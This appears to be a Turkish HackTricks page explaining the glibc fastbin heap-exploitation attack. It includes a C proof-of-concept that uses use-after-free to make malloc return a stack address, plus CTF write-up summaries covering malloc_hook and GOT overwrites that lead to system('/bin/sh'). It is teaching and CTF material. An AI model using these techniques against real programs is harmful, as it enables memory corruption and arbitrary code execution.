# Hızlı Bin Saldırısı

<details>

<summary><strong>Sıfırdan kahraman olmaya kadar AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na(https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

## Temel Bilgiler

Hızlı bir kutunun ne olduğu hakkında daha fazla bilgi için bu sayfaya bakın:

{% content-ref url="bins-and-memory-allocations.md" %}
[bins-and-memory-allocations.md](bins-and-memory-allocations.md)
{% endcontent-ref %}

Hızlı kutu tek yönlü olduğundan, diğer kutulardan çok daha az korumaya sahiptir ve sadece **serbest bırakılan bir hızlı kutuda bir adresi değiştirmek**, daha sonra **herhangi bir bellek adresinde bir parça ayırmak için yeterlidir**.

Özetle:

{% code overflow="wrap" %}
```c
ptr0 = malloc(0x20);
ptr1 = malloc(0x20);

// Put them in fast bin (suppose tcache is full)
free(ptr0)
free(ptr1)

// Use-after-free
// Modify the address where the free chunk of ptr1 is pointing
*ptr1 = (unsigned long)((char *)&<address>);

ptr2 = malloc(0x20); // This will get ptr1
ptr3 = malloc(0x20); // This will get a chunk in the <address> which could be abuse to overwrite arbitrary content inside of it
```
{% endcode %}

Çok iyi açıklanmış bir kod içeren tam bir örneği [https://guyinatuxedo.github.io/28-fastbin\_attack/explanation\_fastbinAttack/index.html](https://guyinatuxedo.github.io/28-fastbin\_attack/explanation\_fastbinAttack/index.html) adresinden bulabilirsiniz:
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(void)
{
puts("Today we will be discussing a fastbin attack.");
puts("There are 10 fastbins, which act as linked lists (they're separated by size).");
puts("When a chunk is freed within a certain size range, it is added to one of the fastbin linked lists.");
puts("Then when a chunk is allocated of a similar size, it grabs chunks from the corresponding fastbin (if there are chunks in it).");
puts("(think sizes 0x10-0x60 for fastbins, but that can change depending on some settings)");
puts("\nThis attack will essentially attack the fastbin by using a bug to edit the linked list to point to a fake chunk we want to allocate.");
puts("Pointers in this linked list are allocated when we allocate a chunk of the size that corresponds to the fastbin.");
puts("So we will just allocate chunks from the fastbin after we edit a pointer to point to our fake chunk, to get malloc to return a pointer to our fake chunk.\n");
puts("So the tl;dr objective of a fastbin attack is to allocate a chunk to a memory region of our choosing.\n");

puts("Let's start, we will allocate three chunks of size 0x30\n");
unsigned long *ptr0, *ptr1, *ptr2;

ptr0 = malloc(0x30);
ptr1 = malloc(0x30);
ptr2 = malloc(0x30);

printf("Chunk 0: %p\n", ptr0);
printf("Chunk 1: %p\n", ptr1);
printf("Chunk 2: %p\n\n", ptr2);


printf("Next we will make an integer variable on the stack. Our goal will be to allocate a chunk to this variable (because why not).\n");

int stackVar = 0x55;

printf("Integer: %x\t @: %p\n\n", stackVar, &stackVar);

printf("Proceeding that I'm going to write just some data to the three heap chunks\n");

char *data0 = "00000000";
char *data1 = "11111111";
char *data2 = "22222222";

memcpy(ptr0, data0, 0x8);
memcpy(ptr1, data1, 0x8);
memcpy(ptr2, data2, 0x8);

printf("We can see the data that is held in these chunks. This data will get overwritten when they get added to the fastbin.\n");

printf("Chunk 0: %s\n", (char *)ptr0);
printf("Chunk 1: %s\n", (char *)ptr1);
printf("Chunk 2: %s\n\n", (char *)ptr2);

printf("Next we are going to free all three pointers. This will add all of them to the fastbin linked list. We can see that they hold pointers to chunks that will be allocated.\n");

free(ptr0);
free(ptr1);
free(ptr2);

printf("Chunk0 @ 0x%p\t contains: %lx\n", ptr0, *ptr0);
printf("Chunk1 @ 0x%p\t contains: %lx\n", ptr1, *ptr1);
printf("Chunk2 @ 0x%p\t contains: %lx\n\n", ptr2, *ptr2);

printf("So we can see that the top two entries in the fastbin (the last two chunks we freed) contains pointers to the next chunk in the fastbin. The last chunk in there contains `0x0` as the next pointer to indicate the end of the linked list.\n\n");


printf("Now we will edit a freed chunk (specifically the second chunk \"Chunk 1\"). We will be doing it with a use after free, since after we freed it we didn't get rid of the pointer.\n");
printf("We will edit it so the next pointer points to the address of the stack integer variable we talked about earlier. This way when we allocate this chunk, it will put our fake chunk (which points to the stack integer) on top of the free list.\n\n");

*ptr1 = (unsigned long)((char *)&stackVar);

printf("We can see it's new value of Chunk1 @ %p\t hold: 0x%lx\n\n", ptr1, *ptr1);


printf("Now we will allocate three new chunks. The first one will pretty much be a normal chunk. The second one is the chunk which the next pointer we overwrote with the pointer to the stack variable.\n");
printf("When we allocate that chunk, our fake chunk will be at the top of the fastbin. Then we can just allocate one more chunk from that fastbin to get malloc to return a pointer to the stack variable.\n\n");

unsigned long *ptr3, *ptr4, *ptr5;

ptr3 = malloc(0x30);
ptr4 = malloc(0x30);
ptr5 = malloc(0x30);

printf("Chunk 3: %p\n", ptr3);
printf("Chunk 4: %p\n", ptr4);
printf("Chunk 5: %p\t Contains: 0x%x\n", ptr5, (int)*ptr5);

printf("\n\nJust like that, we executed a fastbin attack to allocate an address to a stack variable using malloc!\n");
}
```
{% hint style="danger" %}
Eğer global değişken **`global_max_fast`**'in değeri büyük bir sayıyla üzerine yazılabilirse, bu daha büyük boyutlarda fast bin oluşturmayı mümkün kılar, bu da önceden mümkün olmayan senaryolarda fast bin saldırıları gerçekleştirmeye olanak tanır.
{% endhint %}

## Örnekler

* **CTF** [**https://guyinatuxedo.github.io/28-fastbin\_attack/0ctf\_babyheap/index.html**](https://guyinatuxedo.github.io/28-fastbin\_attack/0ctf\_babyheap/index.html)**:**
* Parçalar tahsis edilebilir, sonra serbest bırakılabilir, içerikleri okunabilir ve doldurulabilir (bir taşma güvenlik açığı ile).
* **Infoleak için parça birleştirme**: Teknik temelde taşmayı kötüye kullanarak sahte bir prev\_size oluşturmak ve bir önceki parçaların daha büyük bir parçanın içine yerleştirilmesini sağlamaktır, böylece başka bir parçayı içeren daha büyük bir parça tahsis edildiğinde, verilerini yazdırmak ve libc adresini sızdırmak mümkün olur (main\_arena+88).
* **Malloc hook üzerine yazma**: Bunun için ve önceki üst üste gelme durumunu kötüye kullanarak, aynı belleğe işaret eden 2 parçaya sahip olmak mümkün oldu. Dolayısıyla, ikisini de serbest bırakarak (korumaları atlamak için araya başka bir parça serbest bırakarak) aynı parçayı fast binde 2 kez elde etmek mümkün oldu. Sonra, adresi bir kez daha tahsis etmek, bir sonraki parçanın adresini malloc\_hook'un biraz öncesine işaret etmek (böylece malloc'un bir boş boyut olduğunu düşündüğü bir tamsayıya işaret etmek - başka bir atlatma), bunu tekrar tahsis etmek ve ardından malloc hook adresini alacak başka bir parça tahsis etmek mümkün oldu.\
Sonunda bir **one gadget** oraya yazıldı.
* **CTF** [**https://guyinatuxedo.github.io/28-fastbin\_attack/csaw17\_auir/index.html**](https://guyinatuxedo.github.io/28-fastbin\_attack/csaw17\_auir/index.html)**:**
* Bir heap taşması ve kullanıcı sonrası serbest bırakma ve çift serbest bırakma var çünkü bir parça serbest bırakıldığında işaretçileri tekrar kullanmak ve yeniden serbest bırakmak mümkündür
* **Libc bilgi sızıntısı**: Bazı parçaları serbest bırakın ve bunlar ana arena konumunun bir kısmına bir işaretçi alacaklar. Serbest bırakılan işaretçileri tekrar kullanabileceğiniz için, bu adresi okuyun.
* **Fast bin saldırısı**: Tahsis edilen tüm parçaların işaretçileri bir dizi içinde depolanır, bu nedenle birkaç fast bin parçasını serbest bırakabilir ve en sonuncusunda adresi bu işaretçi dizisinin biraz öncesine işaret edecek şekilde üzerine yazabiliriz. Sonra, aynı boyutta birkaç parça tahsis ederiz ve önce gerçek parçayı ve ardından işaretçi dizisini içeren sahte parçayı alırız. Şimdi bu tahsis işaretçilerini `free`'nin got adresine işaret etmek üzere üzerine yazabiliriz, böylece system'e işaret etmek üzere parça 1 `"/bin/sh"` yazabiliriz ve ardından `free(chunk1)` yapabiliriz ki bu da `system("/bin/sh")`'yi çalıştıracaktır.
* **CTF** [**https://guyinatuxedo.github.io/33-custom\_misc\_heap/csaw19\_traveller/index.html**](https://guyinatuxedo.github.io/33-custom\_misc\_heap/csaw19\_traveller/index.html)
* Bir 1B taşmayı kötüye kullanarak parçaları sıralanmamış binde birleştirme ve bir libc bilgi sızıntısı almak ve ardından malloc hook'u bir one gadget adresiyle üzerine yazmak için fast bin saldırısı örneği
* **CTF** [**https://guyinatuxedo.github.io/33-custom\_misc\_heap/csaw18\_alienVSsamurai/index.html**](https://guyinatuxedo.github.io/33-custom\_misc\_heap/csaw18\_alienVSsamurai/index.html)
* Bir infoleak'ten sonra sıralanmamış binleri kötüye kullanarak bir libc adresi ve bir PIE adresi sızdırmak için bir UAF ile sıralanmamış binleri kötüye kullanarak, bu CTF'nin saldırısı, kontrol edilen parçaların bulunduğu yere bir parça tahsis etmek için fast bin saldırısı kullanarak belirli işaretçileri üzerine yazmak mümkün olduğundan belirli işaretçileri üzerine yazmak mümkün oldu.
* Bir Fast Bin saldırısının bir sıralanmamış bin saldırısı aracılığıyla kötüye kullanıldığını bulabilirsiniz:
* Hızlı bin saldırıları gerçekleştirmeden önce, gerektiğinde libc/heap adreslerini sızdırmak için sıralanmamış liste kötüye kullanımının yaygın olduğunu unutmayın.

{% content-ref url="unsorted-bin-attack.md" %}
[unsorted-bin-attack.md](unsorted-bin-attack.md)
{% endcontent-ref %}

<details>

<summary><strong>Sıfırdan kahraman olmak için AWS hacklemeyi öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keşfedin
* **💬 [Discord grubuna](https://discord.gg/hRep4RUj7f) veya [telegram grubuna](https://t.me/peass) katılın veya** bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)'da **takip edin**.
* **Hacking püf noktalarınızı göndererek HackTricks ve HackTricks Cloud github depolarına PR göndererek paylaşın**.

</details>
